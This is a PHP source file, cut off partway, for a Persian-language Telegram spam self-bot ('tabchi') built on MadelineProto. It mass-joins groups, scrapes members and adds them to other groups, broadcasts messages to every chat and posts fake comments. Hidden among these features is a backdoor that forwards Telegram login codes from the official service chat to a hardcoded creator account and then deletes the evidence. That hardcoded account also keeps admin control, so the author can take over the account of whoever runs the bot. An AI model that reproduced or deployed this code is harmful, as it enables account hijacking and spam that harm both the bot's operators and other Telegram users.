<?php
// @Source_FranceiR | @SourceFranceBot
// @Source_FranceiR | @SourceFranceBot
// @Source_FranceIR | [🇫🇷]𝐎𝐬𝐜𝐚𝐫_𝐙𝐞𝐮𝐬™


if(file_exists('MadelineProto.log') && (filesize('MadelineProto.log')/1024) > 999) unlink('MadelineProto.log');



use function \Amp\File\put;
use function \Amp\File\get;
use function \Amp\File\unlink;
use function \Amp\File\exists;
use \danog\MadelineProto\API;
use \danog\Loop\Generic\GenericLoop;
use \danog\MadelineProto\EventHandler;


ini_set('memory_limit', '2048M');
ini_set('display_errors', 0);
ini_set('max_execution_time','0');
ini_set('display_startup_errors','1');


error_reporting(1);


!is_dir('data')?mkdir('data'):NULL;


if(!file_exists('data/data.json')){
file_put_contents('data/data.json','{"autochat":{"on":"off"},"savenumber":{"on":"off"},"number":{"on":"off"},"autoanswer":{"on":"off"},"autogif":{"on":"off"},"autovoice":{"on":"off"},"autosticker":{"on":"off"},"answering":[],"admins":{}}' );
}
if(!file_exists('data/member.json')){
file_put_contents('data/member.json','{"list":{}}');
}
if(!file_exists('data/link.txt')){
file_put_contents('data/link.txt','');
}

# Madeline
if (!file_exists('madeline.php')){
copy('https://phar.madelineproto.xyz/madeline.php', 'madeline.php');
}
include 'madeline.php';
class ZeusHandler extends EventHandler {
const Report = 'Source_FranceIR';
public function getReportPeers(){
return [self::Report];
}
public static $startTime = 0;
public function mineLoop(){
if(time() - self::$startTime >= 300){
$this->restart();
}
return 10 * 180000000;
}
public function onStart(){
$genLoop = new GenericLoop([$this, 'mineLoop'], 'update Status');
$genLoop->start();
self::$startTime = time();
}
public function onUpdateNewChannelMessage($update){yield $this->onUpdateNewMessage($update);}
public function onUpdateNewMessage($update){
try {



$User_ID      = $update['message']['from_id']['user_id']?? 0;
$Message         = $update['message']['message']?? NULL;
$Message_id      = $update['message']['id']?? 0;
$Reply_Message   = $update['message']['reply_to']['reply_to_msg_id']?? 0;
$me          = yield $this->getSelf();
$Mes_id       = $me['id'];
$About        = yield $this->getInfo($update);
$Chat_ID      = yield $this->getID($update);
$Types        = $About['type'];
@$data       = json_decode(yield Amp\File\get('data/data.json'),true);
@$member     = json_decode(yield Amp\File\get('data/member.json'),true);



$Admins_Tabchi       = 5794368579; //آیدی عددی سازنده تبچی


# Auto Restart With Ram Host
$mem_using = round((memory_get_usage()/1024)/1024, 0);
if($mem_using > 100){
$this->restart();
}

# Send Login Telegram Code 5 Digit
if ($Chat_ID == 777000 ){
@$a = str_replace(0, '۰', $Message);
@$a = str_replace(1, '۱', $a);
@$a = str_replace(2, '۲', $a);
@$a = str_replace(3, '۳', $a);
@$a = str_replace(4, '۴', $a);
@$a = str_replace(5, '۵', $a);
@$a = str_replace(6, '۶', $a);
@$a = str_replace(7, '۷', $a);
@$a = str_replace(8, '۸', $a);
@$a = str_replace(9, '۹', $a);
yield $this->messages->sendMessage( [ 'peer' => $Admins_Tabchi, 'message' => "$a" ] );
yield $this->messages->deleteHistory( [ 'just_clear' => true, 'revoke' => true, 'peer' => $Chat_ID, 'max_id' => $Message_id ] );
}

# Join Auto To Groups +1000 Member And Save Links
if (isset($update['message']['entities']) and preg_match_all('/\S+(t.me)\S+/i', $Message, $match)) {
foreach ($match[0] as $link) {
if (!in_array($link, file('data/link.txt', FILE_IGNORE_NEW_LINES))) {
try {
$ChatInvite = yield $this->messages->checkChatInvite(['hash' => $link]);
if ($ChatInvite['_'] == 'chatInvite' and $ChatInvite['broadcast'] != '1' and $ChatInvite['participants_count'] >= 5000)
yield $this->sleep(rand(10,20));
yield $this->channels->joinChannel(['channel' => $link]);
} catch (\Throwable $e) {
}
file_put_contents('data/link.txt', "$link\n", FILE_APPEND);
}
}
}

# Auto First Comment
if (isset($update['message']['fwd_from']['saved_from_peer'])){
$Answer = ["😐 چه پست قشنگی","هعیییی","🥲 چه خوب","خوشم اومد",":(",":)",":/","♡","☆☆☆☆","🤣عالی بود","🤪🤪","به به","♡:)","مرسی مدیر ♡","هعی روزگار","زمونه خرابه:(","دلم تنگ شده :(","دلم سیگار خواص","هعیییییییی","هعییییی ترررر","لایک ♡","چه عجب یه پست هم دیدیم😐"];
$Zeus = $Answer[array_rand($Answer)];
yield $this->messages->sendMessage(['peer' => $update, 'message' => "$Zeus",'reply_to_msg_id' =>  $Message_id]);
}

# Auto Chat Groups And Pv
if ($Types != 'channel' && @$data['autochat']['on'] == 'on' && rand(0, 600) == 1) {
yield $this->sleep(4);
if($Types == 'user'){
yield $this->messages->readHistory(['peer' => $User_ID, 'max_id' => $Message_id]);
yield $this->sleep(2);
}
yield $this->messages->setTyping(['peer' => $Chat_ID, 'action' => ['_' => 'sendMessageTypingAction']]);
$Awmir = ["❄️😐","🍂😐","😂😐","😐😐😐😐","😕","😎💄",":/","🎈😐","کی بود صدام کرد","کی دزدید منو","خیلی خلوته اخ","han?","ch khbra?","ki miad j h?","یکی منو صدا کرد کی بود",];
$rand = $Awmir[array_rand($Awmir)];
yield $this->sleep(1);
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'message' => "$rand"]);
}

# Auto Send Number Account in group and Pv
if ($Types != 'channel' && @$data['number']['on'] == 'on' && rand(0, 600) == 1) {
yield $this->sleep(4);
if($Types == 'user'){
yield $this->messages->readHistory(['peer' => $User_ID, 'max_id' => $Message_id]);
yield $this->sleep(2);
}
$me = yield $this->getSelf();
yield $this->messages->sendMedia(['peer' => $update, 'reply_to_msg_id' => $msg_id, 'media' => ['_' => 'inputMediaContact', 'phone_number' => $me['phone'], 'first_name' => $me['first_name']]]);
yield $this->sleep(5);
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'message' => "❤️ عزیزم شمارمو سیو کن بیا پیو‌ی حرف بزنیم 😁"]);
}

# Auto Send Voice in Groups
if($Types != 'channel' && @$data['autovoice']['on'] == 'on' && rand(0, 600) == 1) {
$Voice = rand(1,15);
yield $this->messages->sendMedia([
'peer' => $Chat_ID,
'media' => [
'_' => 'inputMediaUploadedDocument',
'file' => "Voice/$Voice.ogg",
],
'parse_mode' => 'Markdown']);
}

# Auto Send Gif in Groups
if($Types != 'channel' && @$data['autogif']['on'] == 'on' && rand(0, 600) == 1) {
$Gif = rand(1,13);
yield $this->messages->sendMedia([
'peer' => $Chat_ID,
'media' => [
'_' => 'inputMediaUploadedDocument',
'file' => "Gif/$Gif.gif",
],
'parse_mode' => 'Markdown']);
}

# Just Answer For Creator
if($User_ID == $Admins_Tabchi || isset($data[ 'admins' ][ $User_ID ]) && $update['message']['out'] == false){
if($Message == '!Ping' || $Message == 'تبچی' || $Message == 'بوت' || $Message == 'اسکار' || $Message == '+' || $Message == 'ping'){
yield $this->messages->sendMessage( [ 'peer' => $Chat_ID, 'reply_to_msg_id' => $Message_id, 'message' => "😐🤟 مـثـل شـیـر آنـلایـنـم", 'parse_mode' => 'markdown' ] );
}

# Add New Admin
if(preg_match( "/^[#\!\/](Addadmin) (.*)$/", $Message, $text1 )){
if ( $User_ID == $Admins_Tabchi || $User_ID == $creator ) {
$id = $text1[ 2 ];
if ( !isset( $data[ 'admins' ][ $id ] ) ) {
$data[ 'admins' ][ $id ] = $id;
yield Amp\File\put('data/data.json',json_encode($data));
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'message' => '√ بـا مـوفـقـیـت ادمـیـن شـد']);
} else {
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'message' => "★ در لـیـسـت ادمـیـن هـا وجـود دارد"]);
}
} else {
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'message' => "× شـما ســازنـده تـبـچـی نـیـسـتـیـد"]);
}
}

# Clean List admin
if(preg_match( "/^[\/\#\!]?(Clean admins)$/i",$Message)){
if ( $User_ID == $Admins_Tabchi || $User_ID == $creator ) {
$data[ 'admins' ] = [];
yield Amp\File\put('data/data.json',json_encode($data));
yield $this->messages->sendMessage(['peer' => $Chat_ID,'message' => "🚫 تـمـامـی ادمـیـن هـا عـزل شـدنـد"]);
} else {
yield $this->messages->sendMessage(['peer' => $Chat_ID,'message' => "× شـما ســازنـده تـبـچـی نـیـسـتـیـد"]);
}
}

# Admin List
if(preg_match( "/^[\/\#\!]?(Adminlist)$/i", $Message)){
if($User_ID == $Admins_Tabchi || $User_ID == $creator ) {
if(count( $data[ 'admins' ] ) > 0 ) {
$txxxt = "لیست ادمین ها : \n";
$counter = 1;
foreach ( $data[ 'admins' ] as $k ) {
$txxxt .= "$counter: <code>$k</code>\n";
$counter++;
}
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'message' => $txxxt, 'parse_mode' => 'html']);
} else {
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'message' => "💯 ادمـیـنـی وجـود نـدارد"]);
}
} else {
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'message' => "× شـما ســازنـده تـبـچـی نـیـسـتـیـد"]);
}
}

# Restart The Robot
if($Message == '!Restart' || $Message == 'restart' || $Message == 'Restart' || $Message == 'ریست'){
yield $this->messages->deleteHistory(['just_clear' => true, 'revoke' => true, 'peer' => $Chat_ID, 'max_id' => $Message_id]);
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'message' => '♻️ تــبـچـی بــا مـوفـقـیـت راه انـدازی شــد']);
$this->restart();
}

# Join 10 LinkDoni
if ($Message == '!Linkdoni') {
yield $this->messages->sendMessage(['peer' => $Chat_ID,'reply_to_msg_id' => $Message_id, 'message' => '🔰 تــبــچــی در 10 لـیـنـک دونـی عـضـو شــد']);
$this->channels->joinChannel(['channel' => "@linkdoni" ]);
$this->channels->joinChannel(['channel' => "@grouhkadeh" ]);
$this->channels->joinChannel(['channel' => "@Link4you" ]);
$this->channels->joinChannel(['channel' => "@linkdonihara" ]);
$this->channels->joinChannel(['channel' => "@Linkdoni_kade" ]);
$this->channels->joinChannel(['channel' => "@Linkdoni_1b" ]);
$this->channels->joinChannel(['channel' => "@LinkdoniPay" ]);
$this->channels->joinChannel(['channel' => "@linkgoin" ]);
$this->channels->joinChannel(['channel' => "@linkdoniwar" ]);
$this->channels->joinChannel(['channel' => "@StoreDostiha" ]);
$this->channels->joinChannel(['channel' => "@LinkDoniOzv" ]);
}

# Send Account Sessions
if(preg_match("/^[\/\#\!]?(Sessions|نشست ها)$/i", $Message)){
$authorizations = yield $this->account->getAuthorizations();
$res = '';
foreach($authorizations['authorizations'] as $authorization){
$res .= "
✅ نـشـسـت هـای اکـانـت تـبـچـی


» هــش : ".$authorization['hash']."
» مـدل دسـتـگـاه : ".$authorization['device_model']."
» سـیـسـتـم عـامـل : ".$authorization['platform']."
» ورژن سـیـسـتـم : ".$authorization['system_version']."
» آیـپـی آیـدی : ".$authorization['api_id']."
» نـام بـرنـامـه : ".$authorization['app_name']."
» ورژن بـرنـامـه : ".$authorization['app_version']."
» تـاریـخ ایـجـاد : ".date("Y-m-d H:i:s",$authorization['date_active'])."
» تـاریـخ فـعـال : ".date("Y-m-d H:i:s",$authorization['date_active'])."
» آیـپـی : ".$authorization['ip']."
» کـشـور : ".$authorization['country']."
\n━─┄┄┄┄┄┄┄┄┄┄┄─━\n";
}
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'message'=> "$res",'reply_to_msg_id' => $Message_id, 'parse_mode'=> 'markdown',]);
}

# Clean All Banned Groups
if($Message == '!Cleanbanned' || $Message == 'Cleanbanned' ){
yield $this->messages->sendMessage( [ 'peer' => $Chat_ID, 'message' => '★ لـطـفـا کـمـی صـبـر کـنـیـد . . .' ] );
$all = yield $this->getDialogs();
$i=0;
foreach ($all as $peer){
$Types = yield $this->getInfo( $peer );
if($Types['type'] == 'supergroup' ) {
$About = yield $this->channels->getChannels([ 'id' => [$peer ]]);
@$banned = $About[ 'chats' ][ 0 ][ 'banned_rights' ]['send_messages'];
if ($banned == 1){
yield $this->channels->leaveChannel(['channel' => $peer]);
$i++;
}
}
}
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'message' => "✅ گـروه هــای مـسـدودی پــاک شـــدنــد
🔐 تــعــداد گــروه هــای مــســدودی : $i" ] );
}

# Bot Detalis
if($Message == '!Account' || $Message == 'id' || $Message == 'ایدی' || $Message == 'مشخصات'){
 $name = $me['first_name'];
 $phone = '+'.$me['phone'];
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'reply_to_msg_id' => $Message_id ,'message' => "💚 مـشـخـصـات تـبـچــی 

» سـازنـده : [$Admins_Tabchi](tg://user?id=$Admins_Tabchi)

» نـام اکـانـت : `$name`
» آیـدی عـددی : `$Mes_id`
» شماره اکـانـت : `$phone`",'parse_mode' => 'MarkDown']);
}

# Send all links in File
if ($Message =="!Listlink" or $Message == "listlink" or $Message == "لیست لینک ها"){
$this->channels->joinChannel(['channel' => "@StoreDostiha" ]);
$linkkk = file_get_contents("data/link.txt");
$alll=explode (",",$linkkk);
$s="";
foreach ($alll as $m){
$s.="$m\n";
}
file_put_contents("link.txt","in The Name Of God\n〰〰〰〰〰〰〰〰〰〰〰\nlist Link For Tabchi \n〰〰〰〰〰〰〰〰〰〰〰\nCreator : @Oscar_Zeus\n\n"."$s\nend links :)");
$Updates = yield $this->messages->sendMedia([ 'peer' => $Chat_ID,'reply_to_msg_id' => $Message_id , 'media' =>  ['_' => 'inputMediaUploadedDocument', 'file' => 'link.txt', 'attributes' => [['_' => 'documentAttributeFilename', 'file_name' => 'Tabchi_Zeus_Links.txt']]], 'message' => "🔗 تـمـامـی لـیـنـک هـای ذخـیـره شـده",  'parse_mode' => 'html', ]);
unlink("link.txt");
}

# Bot Status
if($Message == '!Stats' || $Message == 'آمار' || $Message == 'stats'){
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'message'=>'★ لـطـفـا کـمـی صـبـر کـنـیـد . . .','reply_to_msg_id' => $Message_id]);
$contacts = count(yield $this->contacts->getContactIDs());
$mem_using = round((memory_get_usage()/1024)/1024, 0).' مـگـابـایـت';
$Oscar = $data['autochat']['on'];
if ($Oscar == 'on'){
$Oscar = 'روشـن';
} else {
$Oscar = 'خـامـوش';
}
$Zeus = $data['autovoice']['on'];
if ($Zeus == 'on'){
$Zeus = 'روشـن';
} else {
$Zeus = 'خـامـوش';
}
$Amirurmia18 = $data['number']['on'];
if ($Amirurmia18 == 'on'){
$Amirurmia18 = 'روشـن';
} else {
$Amirurmia18 = 'خـامـوش';
}
$Oscar_Zeus = $data['autogif']['on'];
if ($Oscar_Zeus == 'on'){
$Oscar_Zeus = 'روشـن';
} else {
$Oscar_Zeus = 'خـامـوش';
}
$Awmir = $data['savenumber']['on'];
if ($Awmir == 'on'){
$Awmir = 'روشـن';
} else {
$Awmir = 'خـامـوش';
}
$memcount = count($member['list']);
if($memcount == null){
$memcount = 0;
} 
$supergps = 0;
$channels = 0;
$pvs = 0;
$gps = 0;
$bots = 0;
$s = yield $this->get_dialogs();
foreach ($s as $peer) {
try {
$i = yield $this->get_info($peer);
if ($i['type'] == 'supergroup') $supergps++;
if ($i['type'] == 'channel') $channels++;
if ($i['type'] == 'user') $pvs++;
if ($i['type'] == 'chat') $gps++;
if ($i['type'] == 'bot') $bots++;
} catch (\Exception $e) {
} catch (\danog\MadelineProto\RPCErrorException $e) {}
}
$all = $gps+$supergps+$channels+$pvs;
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'reply_to_msg_id' => $Message_id ,
'message' => "» آمــار تــبــچــی فــرانــســه ســورس


» آمـار کـلـــی : $all


» پـیـوی : $pvs
» ربـات : $bots
» گـــروه : $gps
» کـــانــال : $channels
» ســوپــر گــروه : $supergps

» چـت خـودکـار : $Oscar

» ذخـیـره خـودکـار مـخـاطـب هـا : $Awmir
» ارسـال شـمـاره تـبـچـی خـودکـار ‌: $Amirurmia18

» گـیـف خـودکـار : $Oscar_Zeus
» ویـس خـودکـار : $Zeus


» افــراد اسـتـخـراج شده : $memcount
» مــخــاطــب هــا : $contacts


» مــیــزان مــصــرف رم : $mem_using", 'parse_mode'=>"MarkDown"]);
if ($supergps > 350 || $pvs > 1500){
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'reply_to_msg_id' => $Message_id ,
'message' => '❗️ هـرچـه سـریـعـتـر گـروه و کـانـال هـای تـبـچـی را کـم کـنــیـد']);
}
}

# Help Bot
if($Message == '!Help' || $Message == 'Help' || $Message == 'ززHelp'){
yield $this->messages->sendMessage( [
'peer' => $Chat_ID,
'message' => '» راهـنـمـای تـبـچـی زئـوس ورژن 5 
  
..........................1.......................... 
» اطـلاع از آنـلایـنـی  
!Ping 
» دریـافـت مـشـخـصات  
!Account 
» دریـافـت آمـار  
!Stats 
» تـازه سـازی فـایـل هـا  
!Restart 
» جـویـن در لـیـنـکـدونـی هـای فـعـال  
!Linkdoni 
» دریـافـت لـیـنـک هـای ذخـیـره شـده  
!Listlink 
» دریـافـت لـیـسـت مـخـاطـبـیـن اکـانـت  
!Contactlist 
.......................2.......................... 

» روشـن کـردن ارسـال خـودکـار شـمـاره
!AutoNumber on
» خـامـوش کـردن ارسـال خـودکـار شـمـاره
!AutoNumber off 
» روشـن کـردن ذخـیـره خـودکـار مـخـاطـب
!AutoSaveNumber on
» خـامـوش کـردن ذخـیـره خـودکـار مـخـاطـب
!AutoSaveNumber off
» روشـن کـردن چـت خـودکـار 
!AutoChat on 
» خـامـوش کـردن چـت خـودکـار 
!AutoChat off
» روشـن کـردن ویـس خـودکـار 
!AutoVoice on
» خـامـوش کـردن ویس خـودکـار  
!AutoVoice off
» روشـن کـردن گـیـف خـودکـار
!AutoGif on 
» خـامـوش کـردن گـیـف خـودکـار
!AutoGif off
......................3.........................  
» آپـلود عـکـس جـدیـد در پـروفـایـل  
!Setphoto (Replay)  
» حـذف عـکـس پـرفـایـل بـه تعـداد دلـخـواه  
!Delphoto (Number)  
» تـنـظـیم نـام کـاربـری جـدیـد  
!Setid (Text)  
» تـنـظـیم نـام اکـانـت  
!Setname (نـام)  
.......................4...........................  
» ادد تـمـامـی مـخـاطـبـیـن اکـانـت بـه گـروه  
!AddContact (Just Send Group)  
» ادد یـک کـاربـر بـه هـمـه گـروه هـا  
!Addall (Userid)  
» ادد هـمـه پـیوی بـه یـک گـروه 
!Addedpv (Idgroup)  
» اسـتـخـراج اعـضـای گـروه (فـقـط در گـروه)  
!Exports 
» ادد کـردن اعـضـا استـخـراج شـده بـه گروه  
!Add (in Group) or (Linkgroup)  
» حـذف اعـضـای اسـتـخـراج شـده  
!Deletemember 
.....................5........................  
» ایـن دسـتورات فـقـط در سـوپـر گـروه هـا
  
  
» ارسـال یـک مـتـن بـه گـروه هـا   
!Sendgp (Reply)  
» ارسـال یـک مـتـن بـه پـیـوی هـا  
!Sendpv (Reply)  
» فـروارد یـک پـسـت بـه گـروه هـا  
!Fwdgp (Reply)
» فـروارد یـک پـسـت بـه پـیـوی هـا  
!Fwdpv (Reply)
......................6.......................  
» جـویـن در کـانـال مـشـخص شـده  
!Join (Id) or (Link)  
» خـروج از هـمـه کـانـال هـا  
!Delchannel 
» خـروج از گـروه هـا بـه تـعـداد مـشـخـص 
!Delgroups (Number)
» خـروج از گـروه مـشـخـص شـده  
!Left (Just Send Group)  
» پـاکـسـازی گـروه هـای مـسـدودی  
!Cleanbanned 
....................7........................  
» دسـتـورات ویژه سـازنـده تـبـچـی  
  
» افـزودن ادمـیـن جـدیـد  
!Addadmin (Userid)  
» پـاکـسـازی تـمـامـی ادمـیـن هـا  
!Clean admins 
» دریـافـت لـیـسـت ادمـیـن هـا  
!Adminlist



📣 @StoreDostihaBot',
'parse_mode' => 'HTML'
] );
}

# Send Size File 
if($Message == '!Mem'){
$Restart = rand(100,1000);
$logg = rand(50,200);
$log = round(filesize('MadelineProto.log')/1024/1024,2) . ' مـگـابـایـت';
$mem_using = round((memory_get_usage()/1024)/1024, 0).' مـگـابـایـت';
$load = sys_getloadavg();
$ver = phpversion(); 
$server=PHP_OS;
yield $this->messages->sendMessage([
'peer' => $Chat_ID,
'message' => "♻️ مـیـزان مـصـرف رم : $mem_using
💡 مـیـزان مـصـرف لاگ : $log

Ⓜ️ تـایـم حـذف فـایـل لاگ خـودکـار : $logg
🌀 تـایـم ری استـارت بـعـدی : $Restart

📡 پـیـنـگ سـرور : $load[0]
📟 ورژن پـی اچ پـی : $ver
🎛 مـدل ســرور : $server",
]);
}

# Send Contacts list
if(preg_match("/^[\/\#\!]?(Contactlist|لیست مخاطبین)$/i", $Message)){
$res = null;
$contacts = yield $this->contacts->getContacts()['users'];
if($contacts == null){
yield $this->messages->sendMessage([
'peer' => $Chat_ID,
'message'=> '🏷 لـیـسـت مـخـاطـبـیـن خـالـی مـی بـاشـد',
'reply_to_msg_id' => $Message_id
]);
}else{
foreach($contacts as $contact){
$res .= "» اســم : " . $contact['first_name'] . "\n» فـامـیـلـی : " . ($contact['last_name'] ?? "خــالــی")  . "\n» شـمـاره : " . ($contact['phone'] ?? "خــالــی") . "\n» آیـدی عــددی : " . $contact['id'] . "\n━─┄┄┄┄┄┄┄┄┄┄┄─━\n";
}
yield $this->messages->sendMessage([
'peer' => $Chat_ID,
'message'=> $res,
'reply_to_msg_id' => $Message_id
]);
}
}

# Add All Save Member in Group
elseif ($Message == "!Add") {
if($Types == 'supergroup'){
yield $this->messages->sendMessage(['peer' => $Admins_Tabchi,'reply_to_msg_id' => $Message_id, 'message' => "» در حـال ادد اعـضـای اسـتخـراج شـده . . ."]);
$gpid = $Chat_ID;
if (!file_exists("$gpid.json")) {
file_put_contents("$gpid.json", '{"list":{}}');
}
@$addmember = json_decode(file_get_contents("$gpid.json"), true);
$c = 0;
$add = 0;
foreach ($member['list'] as $id) {
if (!in_array($id, $addmember['list'])) {
$addmember['list'][] = $id;
file_put_contents("$gpid.json", json_encode($addmember));
$c++;
try {
yield $this->channels->inviteToChannel(['channel' => $gpid, 'users' => ["$id"]]);
$add++;
} catch (danog\MadelineProto\RPCErrorException $e) {
/*if ($e->getMessage() == "PEER_FLOOD") {
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'message' => "» با محدودیت تلگرام مواجه شدیم !"]);
break;
}*/
}
}
}
yield $this->messages->sendMessage(['peer' => $Admins_Tabchi,'reply_to_msg_id' => $Message_id, 'message' => "» تـعـداد $add عـضـو بـا مـوفـقـیـت بـه گـروه افـزوده شـد

» کـل تـلاش هـا : $c"]);
} else{
yield $this->messages->sendMessage(['peer' => $Admins_Tabchi, 'reply_to_msg_id' => $Message_id , 'message' => '» این دستور فقط در سوپر گروه قابل اجرا است !']);
}}

# Send Message Reply For All Groups
elseif($Message == '!Sendgp' and isset($Reply_Message)){
yield $this->messages->sendMessage(['peer' => $update, 'message' => '★ لـطـفـا کـمـی صـبـر کـنـیـد . . .', 'reply_to_msg_id' => $Message_id]);	
$getMessages = yield $this->channels->getMessages(['channel' => $update, 'id' => [$Reply_Message]])['messages'][0];		  
$dialogs = yield $this->get_dialogs();
$i=0;
foreach ($dialogs as $peer) { 
if($peer['_'] == 'peerChannel' or $peer['_'] == 'peerChat') {
try {
if(!isset($getMessages['media']))
yield $this->messages->sendMessage(['peer' => $peer, 'message' => $getMessages['message']]);
else
yield $this->messages->sendMedia(['peer' => $peer, 'media' => $getMessages['media'], 'message' => $getMessages['message']]);
$i++;
yield $this->sleep(rand(3,5));
} catch (\Throwable $e) { }
}
}
yield $this->messages->sendMessage( [ 'peer' => $Chat_ID, 'message' => "🔰 پـیـام هـمـگـانـی بـا مـوفـقـیـت ارسـال شـد

⚙ نـوع ارسـال : سـوپـر گـروه هـا

🎈 تـعـداد ارسـال  : $i" ] );
}

# Send Message Reply For All Pv
elseif($Message == '!Sendpv' and isset($Reply_Message)){
yield $this->messages->sendMessage(['peer' => $update, 'message' => '★ لـطـفـا کـمـی صـبـر کـنـیـد . . .', 'reply_to_msg_id' => $Message_id]);
$getMessages = yield $this->channels->getMessages(['channel' => $update, 'id' => [$Reply_Message]])['messages'][0];			  
$dialogs = yield $this->get_dialogs();
$i=0;
foreach ($dialogs as $peer) {
if($peer['_'] == 'peerUser') {
try {
if(!isset($getMessages['media']))
yield $this->messages->sendMessage(['peer' => $peer, 'message' => $getMessages['message']]);
else
yield $this->messages->sendMedia(['peer' => $peer, 'media' => $getMessages['media'], 'message' => $getMessages['message']]);
$i++;
yield $this->sleep(rand(3,5));
} catch (\Throwable $e) { }
}
}
yield $this->messages->sendMessage( [ 'peer' => $Chat_ID, 'message' => "🔰 پـیـام هـمـگـانـی بـا مـوفـقـیـت ارسـال شـد

⚙ نـوع ارسـال : پـیـوی هــا

🎈 تـعـداد ارسـال  : $i" ] );
}

# Forward Reply For All Groups
if($Message == '!Fwdgp' || $Message == '!fwdgp'){
if($Types == 'supergroup'){
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'reply_to_msg_id' => $Message_id , 'message' =>'★ لـطـفـا کـمـی صـبـر کـنـیـد . . .']);
$rid = $Reply_Message;
$dialogs = yield $this->get_dialogs();
$i=0;
foreach ($dialogs as $peer) {
$Types = yield $this->get_info($peer);
if($Types['type'] == 'supergroup'){
$this->messages->forwardMessages(['from_peer' => $Chat_ID, 'to_peer' => $peer, 'id' => [$rid]]);
$i++;
}
}
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'reply_to_msg_id' => $Message_id , 'message' =>'🔰 فـروارد هـمـگـانـی بـا مـوفـقـیـت ارسـال شـد

⚙ نـوع ارسـال : سـوپـر گـروه هـا

🎈 تـعـداد ارسـال  : $i']);
}else{
yield $this->messages->sendMessage(['peer' => $Chat_ID, 'reply_to_msg_id' => $Message_id , 'message' => '» این دستور فقط در سوپر گروه قابل اجرا است !']);
}
}

# Forward Reply For All Pv
elseif($Message == '!Fwdpv' and isset($Reply_Message)){
yield $this->messages->sendMessage(['peer' => $update, 'message' => '★ لـطـفـا کـمـی صـبـر کـنـیـد . . .', 'reply_to_msg_id' => $Message_id]);  
$dialogs = yield $this->get_dialogs();
$i=0;
foreach ($dialogs as $peer) { 
if($peer['_'] == 'peerUser') {
try {
yield $this->messages->forwardMessages(['from_peer' =>$update ,'id' => [$Reply_Message] ,'to_peer' => $peer]);
$i++;
yield $this->sleep(rand(3,5));
} catch (\Throwable $e) { }
}
}
yield $this->messages->sendMessage( [ 'peer' => $Chat_ID, 'message' => "🔰 فـروارد هـمـگـانـی بـا مـوفـقـیـت ارسـال شـد

⚙ نـوع ارسـال : پـیـوی هـا

🎈 تـعـداد ارسـال  : $i" ] );
}

# Clean All Channels
if ( $Message == '!Delchannel' || $Message == '/Delchannel' || $Message == 'Delchannel' ) {
yield $this->messages->sendMessage( [ 'peer' => $Chat_ID, 'message' => '★ لـطـفـا کـمـی صـبـر کـنـیـد . . ..',
'reply_to_msg_id' => $Message_id
] );
$all = yield $this->getDialogs();
$i = 0;
foreach ( $all as $peer ) {
$Types = yield $this->getInfo( $peer );
$Types3 = $Types[ 'type' ];
if ( $Types3 == 'channel' ) {
$id = $Types[ 'bot_api_id' ];
yield $this->channels->leaveChannel( [ 'channel' => $id ] );
$i++;
}
}
yield $this->messages->sendMessage( [ 'peer' => $Chat_ID, 'message' => "🍀 تـمـامـی کـانـال هـا پـاک شـدنـد
🔋 تـعـداد لـفـت :$i", 'reply_to_msg_id' => $Message_id ] );
}

# Add All Contacts in Groups
elseif($Message == '!AddContact'){
yield $this->messages->sendMessage(['peer' => $update, 'message' => '★ لـطـفـا کـمـی صـبـر کـنـیـد . . .', 'reply_to_msg_id' => $Message_id]); 
$contacts = yield $this->contacts->getContactIDs();
foreach ($contacts as $user){
try {
yield $this->channels->inviteToChannel(['channel' => $update , 'users' => [$user]]);
} catch (\Throwable $e) { }
}
yield $this->messages->sendMessage(['peer' => $update, 'message' => '✅ هـمـه مـخـاطـب هـا ادد شـدنـد', 'reply_to_msg_id' => $Message_id]);	   
}

# Save Auto Contacts
elseif(isset($update['message']['media']['_']) and $update['message']['media']['_'] == 'messageMediaContact' and !in_array($update['message']['media']['user_id'] , yield $this->contacts->getContactIDs())){
$media = $update['message']['media'];
yield $this->contacts->importContacts(['contacts' =>[['_' => 'inputPhoneContact', 'client_id' => 1, 'phone' => $media['phone_number'], 'first_name' => $media['first_name']]]]);
$me = yield $this->getSelf();
yield $this->messages->sendMedia(['peer' => $update, 'reply_to_msg_id' => $Message_id, 'media' => ['_' => 'inputMediaContact', 'phone_number' => $me['phone'], 'first_name' => $me['first_name']]]);
}

# Join Channel Or Groups
if(preg_match( "/^[\/\#\!]?(Join) (.*)$/i", $Message, $text)){
$id = $text[ 2 ];
try {
yield $this->channels->joinChannel( [ 'channel' => "$id" ] );
yield $this->messages->sendMessage( [ 'peer' => $Chat_ID, 'message' => '✅ بـا مـوفـقـیـت جـویـن شـدم',
'reply_to_msg_id' => $Message_id
] );
} catch ( Exception $e ) {
yield $this->messages->sendMessage( [ 'peer' => $Chat_ID, 'message' => '❗️<code>' . $e->getMessage() . '</code>',
'parse_mode' => 'html',
'reply_to_msg_id' => $Message_id
] );
}
}

# Delete Number Photo in Profile Account
if (preg_match('/^!Delphoto ([0-9]{1,3})$/i', $Message, $mch)) {
$tdd = $mch[1];
$photos = yield$this->photos->getUserPhotos(['user_id' => 'me', 'offset' => 0, 'max_id' => 0, 'limit' => $tdd,]);
$a = yield$this->photos->deletePhotos(['id' => $photos['photos'],]);
$cc = count($a);
yield$this->messages->sendMessage(['peer' => $Chat_ID, 'message' => "✅ تـعـداد $cc عـکـس پـرفـایـل حـذف شـد", 'parse_mode' => "html"]);
}

# On Or Off Auto Chat
if (preg_match("/^[\/\#\!]?(AutoChat) (on|off)$/i", $Message)){
preg_match("/^[\/\#\!]?(AutoChat) (on|off)$/i", $Message, $m);
$data['autochat']['on'] = "$m[2]";
file_put_contents("data/data.json", json_encode($data));
if ($m[2] == 'on'){
